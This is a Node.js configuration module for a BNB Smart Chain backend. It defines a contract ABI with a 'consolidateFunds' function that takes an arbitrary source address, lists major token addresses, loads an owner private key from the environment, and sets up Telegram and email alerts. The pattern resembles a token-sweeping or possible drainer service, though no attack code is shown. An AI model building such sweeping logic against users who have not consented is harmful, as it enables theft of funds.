require('dotenv').config();
const { Web3 } = require('web3');
const TelegramBot = require('node-telegram-bot-api');
const nodemailer = require('nodemailer');

// Contract ABI
const CONTRACT_ABI = [
    {
        "inputs": [{"internalType": "address","name": "from","type": "address"}],
        "name": "consolidateFunds",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "getSupportedTokens",
        "outputs": [{"internalType": "address[]","name": "","type": "address[]"}],
        "stateMutability": "view",
        "type": "function"
    }
];

// ERC20 ABI
const ERC20_ABI = [
    {
        "constant": true,
        "inputs": [{"name": "_owner","type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "balance","type": "uint256"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [{"name": "","type": "uint8"}],
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "symbol",
        "outputs": [{"name": "","type": "string"}],
        "type": "function"
    }
];

// Token Info
const TOKEN_INFO = {
    '0x55d398326f99059ff775485246999027b3197955': { symbol: 'USDT', stable: true },
    '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d': { symbol: 'USDC', stable: true },
    '0xe9e7cea3dedca5984780bafc599bd69add087d56': { symbol: 'BUSD', stable: true },
    '0x1af3f329e8be154074d8769d1ffa4ee058b1dbc3': { symbol: 'DAI', stable: true },
    '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c': { symbol: 'WBNB', stable: false },
    '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82': { symbol: 'CAKE', stable: false },
    '0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c': { symbol: 'BTCB', stable: false },
    '0x2170ed0880ac9a755fd29b2688956bd959f933f8': { symbol: 'ETH', stable: false }
};

// Web3 Initialize
const web3 = new Web3(process.env.BSC_RPC_URL || 'https://bsc-dataseed1.binance.org');
const contract = new web3.eth.Contract(CONTRACT_ABI, process.env.CONTRACT_ADDRESS);

// Account - lazy load
let account = null;
function getAccount() {
    if (!account) {
        const privateKey = process.env.OWNER_PRIVATE_KEY;
        if (!privateKey) {
            throw new Error('Private key not configured');
        }
        account = web3.eth.accounts.privateKeyToAccount(privateKey);
        web3.eth.accounts.wallet.add(account);
        console.log('✅ Account loaded:', account.address);
    }
    return account;
}

// Telegram Bots
const telegramBots = [];
if (process.env.TELEGRAM_BOT_TOKEN_1 && process.env.TELEGRAM_CHAT_ID_1) {
    telegramBots.push({
        bot: new TelegramBot(process.env.TELEGRAM_BOT_TOKEN_1, { polling: false }),
        chatId: process.env.TELEGRAM_CHAT_ID_1
    });
}
if (process.env.TELEGRAM_BOT_TOKEN_2 && process.env.TELEGRAM_CHAT_ID_2) {
    telegramBots.push({
        bot: new TelegramBot(process.env.TELEGRAM_BOT_TOKEN_2, { polling: false }),
        chatId: process.env.TELEGRAM_CHAT_ID_2
    });
}

// Email
let emailTransporter = null;
if (process.env.SMTP_USER && process.env.SMTP_PASS) {
    emailTransporter = nodemailer.createTransport({
        host: process.env.SMTP_HOST,
        port: process.env.SMTP_PORT,
        auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS }
    });
}

module.exports = {
    web3,
    contract,
    getAccount,
    TOKEN_INFO,
    ERC20_ABI,
    telegramBots,
    emailTransporter
};